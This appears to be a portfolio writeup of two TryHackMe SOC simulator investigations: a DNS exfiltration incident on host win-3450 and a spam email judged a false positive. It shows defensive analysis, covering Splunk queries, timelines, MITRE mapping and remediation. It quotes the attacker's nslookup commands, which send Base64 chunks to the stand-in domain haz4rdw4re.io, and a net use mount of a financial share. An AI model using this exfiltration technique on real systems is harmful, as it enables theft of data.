# SOC Investigation Writeup
## TryHackMe SOC Simulator — Alert Investigation

**Author:** Said  
**Platform:** TryHackMe SOC Immersive Simulator  
**Tools Used:** Splunk SIEM, Sysmon, Email Datasource  
**Date:** May 2026

---

## Overview

This writeup documents two alert investigations conducted in the TryHackMe SOC Simulator. The investigations demonstrate core SOC analyst skills including alert triage, log analysis in Splunk, attack chain reconstruction, and distinguishing True Positives from False Positives.

---

## Investigation 1 — Alert 1025: DNS Exfiltration via PowerShell

### Alert Details

| Field | Value |
|---|---|
| Alert ID | 1025 |
| Alert Rule | Suspicious Parent Child Relationship |
| Severity | High |
| Type | Process |
| Timestamp | 05/05/2026 08:42:47 |
| Host | win-3450 |
| Datasource | Sysmon (Event Code 1) |
| Verdict | **TRUE POSITIVE** |

### Initial Alert Indicators

The alert was triggered by an unusual parent-child process relationship:

```
Parent Process : powershell.exe (PID 3728)
Child Process  : nslookup.exe (PID 5520)
Command Line   : "C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
Working Dir    : C:\Users\michael.ascot\downloads\exfiltration\
```

### Splunk Investigation

**Query used:**
```splunk
index=* "win-3450" "3728"
```
**Result:** 15 events returned — full attack chain reconstructed.

### Attack Timeline

| Time | Event | Significance |
|---|---|---|
| 08:40:30 | PowerShell script created in Temp folder | Initial execution — attacker's script starts running |
| 08:42:04 | Folder `exfiltration` created in Downloads | Staging area prepared for stolen data |
| 08:42:11 | `net.exe use Z: \\FILESRV-01\SSF-FinancialRecords` | Financial file server mounted as drive Z: |
| 08:43:09 | `net.exe use Z: /delete` | Drive disconnected to remove access traces |
| 08:43:27 | `exfilt8me.zip` created in exfiltration folder | Stolen files compressed for exfiltration |
| 08:43:56 | Multiple nslookup processes spawned with Base64 subdomains | ZIP file sent out via DNS tunneling |
| 08:44:12 | Additional nslookup calls from downloads folder | Exfiltration complete |

### Attack Chain Reconstruction

```
[08:40] PowerShell executed on win-3450
            |
            v
[08:42] Created staging folder: C:\Users\michael.ascot\Downloads\exfiltration\
            |
            v
[08:42] Mounted \\FILESRV-01\SSF-FinancialRecords --> Drive Z:
        (Accessed company financial records remotely)
            |
            v
[08:43] Disconnected Drive Z: (anti-forensics)
            |
            v
[08:43] Compressed stolen files --> exfilt8me.zip
            |
            v
[08:43-44] Split ZIP into Base64 chunks
           Sent each chunk via nslookup DNS queries to haz4rdw4re.io
            |
            v
[Attacker] Received all chunks --> Rebuilt ZIP --> Obtained financial records
```

### DNS Exfiltration Explained

The attacker abused `nslookup.exe` (a legitimate Windows tool) to exfiltrate data:

```
Normal usage   : nslookup google.com
Malicious usage: nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io
                           |________________________________|____________|
                                   Base64 encoded data       Attacker domain
```

The file was split into multiple chunks and sent as DNS subdomains. DNS traffic is rarely blocked by firewalls, making this an effective covert channel.

### Entities Involved

| Entity Type | Value |
|---|---|
| Compromised Host | win-3450 |
| Compromised User | michael.ascot |
| Attacker Domain | haz4rdw4re.io |
| Targeted Server | FILESRV-01 |
| Targeted Share | SSF-FinancialRecords |
| Malicious File | exfilt8me.zip |
| Staging Folder | C:\Users\michael.ascot\Downloads\exfiltration\ |
| PS Script | __PSScriptPolicyTest_b1baaotg.vsb.ps1 |

### MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| PowerShell | T1059.001 | powershell.exe used to execute all attacker commands |
| DNS Exfiltration | T1048.001 | nslookup with Base64 data sent to attacker domain |
| Data Staged | T1074.001 | exfiltration folder created as staging area |
| Archive Collected Data | T1560.001 | Files compressed into exfilt8me.zip |
| Network Share Discovery | T1135 | Accessed \\FILESRV-01\SSF-FinancialRecords |
| Indicator Removal | T1070 | net use Z: /delete to remove network drive traces |
| Living off the Land | T1218 | Used net.exe and nslookup.exe (built-in Windows tools) |

### Key Findings

- **TRUE POSITIVE** — Confirmed active data exfiltration incident
- Attacker accessed sensitive financial records from `FILESRV-01`
- Data was exfiltrated using DNS tunneling to evade firewall detection
- Built-in Windows tools were abused to avoid antivirus detection (Living off the Land)
- Anti-forensics techniques used (drive disconnection after use)

### Recommended Actions

1. **Immediate:** Isolate host `win-3450` from network
2. **Immediate:** Block domain `haz4rdw4re.io` at DNS/firewall level
3. **Short-term:** Reset credentials for user `michael.ascot`
4. **Short-term:** Audit access logs on `FILESRV-01` for scope of data accessed
5. **Short-term:** Investigate initial access vector (possible phishing — see Alert 1035)
6. **Long-term:** Implement DNS monitoring rules to detect Base64 subdomains
7. **Long-term:** Create SIEM rule to alert on PowerShell spawning nslookup with external domains

---

## Investigation 2 — Alert 1011: Suspicious Email from External Domain

### Alert Details

| Field | Value |
|---|---|
| Alert ID | 1011 |
| Alert Rule | Suspicious email from external domain |
| Severity | Low |
| Type | Phishing |
| Timestamp | 05/30/2026 05:37:42 |
| Datasource | Email |
| Verdict | **FALSE POSITIVE** |

### Email Details

| Field | Value |
|---|---|
| Sender | keane@modernmillinerygroup.online |
| Recipient | michael.ascot@tryhatme.com |
| Subject | Amazing Hat Enhancement Pills Grow Your Hat Collection Instantly |
| Attachment | None |
| Direction | Inbound |
| Content | "Want a bigger more impressive hat collection. Our revolutionary hat growth formula guarantees results in just days. Try now before the FDA finds out" |

### Time of Activity

05/30/2026 05:37:42 AM

### List of Related Entities

| Entity Type | Value |
|---|---|
| Sender Email | keane@modernmillinerygroup.online |
| Sender Domain | modernmillinerygroup.online |
| Recipient Email | michael.ascot@tryhatme.com |
| Subject | Amazing Hat Enhancement Pills Grow Your Hat Collection Instantly |
| Datasource | Email (Inbound) |

### Splunk Investigation

**Query used:**
```splunk
index=* "michael.ascot@tryhatme.com" "keane@modernmillinerygroup.online"
```
**Result:** 1 event — only the email itself, no follow-up activity on recipient host.

**Follow-up query:**
```splunk
index=* "10.10.230.215"
```
**Result:** 0 events — no activity recorded from the recipient's host after email delivery.

### Analysis

| Indicator | Assessment |
|---|---|
| Malicious attachment | None — no attack vector |
| Suspicious links in body | None found |
| Targeted attack characteristics | No — generic spam content |
| User interaction after email | No evidence |
| Host activity after delivery | No suspicious processes or connections |
| SOC Lead note | "Detection rule still needs fine-tuning" |

### Why This is a False Positive

The email exhibits classic **unsolicited commercial spam** characteristics:

1. **No attachment** — phishing attacks require a delivery mechanism (file or link)
2. **No links** — no URL to redirect victim to a malicious page
3. **Generic content** — exaggerated product claims targeting no specific individual
4. **False urgency** — "before the FDA finds out" is a typical spam pressure tactic
5. **No follow-up activity** — recipient host showed zero suspicious behavior after delivery
6. **Rule acknowledgment** — SOC Lead noted the detection rule requires tuning

### Key Findings

- **FALSE POSITIVE** — Generic spam email with no malicious capability
- No indicators of compromise on recipient host
- Detection rule is over-sensitive, generating noise on benign spam

### Recommended Actions

1. **No incident response required**
2. **Rule tuning** — Refine the detection rule to filter out emails with no attachments and no links from the alert queue
3. **Optional** — Add sender domain to spam blocklist to reduce noise

---

## Skills Demonstrated

| Skill | Applied In |
|---|---|
| Alert triage and prioritization | Both investigations |
| Splunk SPL query writing | Both investigations |
| Sysmon log analysis | Alert 1025 |
| Parent-child process analysis | Alert 1025 |
| Attack chain reconstruction | Alert 1025 |
| DNS exfiltration detection | Alert 1025 |
| MITRE ATT&CK mapping | Alert 1025 |
| Email header analysis | Alert 1011 |
| False positive identification | Alert 1011 |
| Case report writing | Both investigations |

---

## Lessons Learned

1. **Not every alert is a real threat** — 1011 was spam, 1025 was a serious incident. Triage skills are critical.
2. **Living off the Land attacks are hard to detect** — Attackers used only built-in Windows tools (net.exe, nslookup.exe), making signature-based detection ineffective.
3. **DNS is not just for browsing** — DNS traffic can be weaponized as a covert data exfiltration channel that bypasses most firewalls.
4. **Follow the PID** — Tracking the parent process ID (3728) across all events was the key to reconstructing the full attack chain.
5. **Timestamps tell the story** — Sorting events chronologically revealed the attacker's step-by-step methodology.

---

*Writeup produced as part of cybersecurity portfolio — TryHackMe SOC Immersive Simulator*
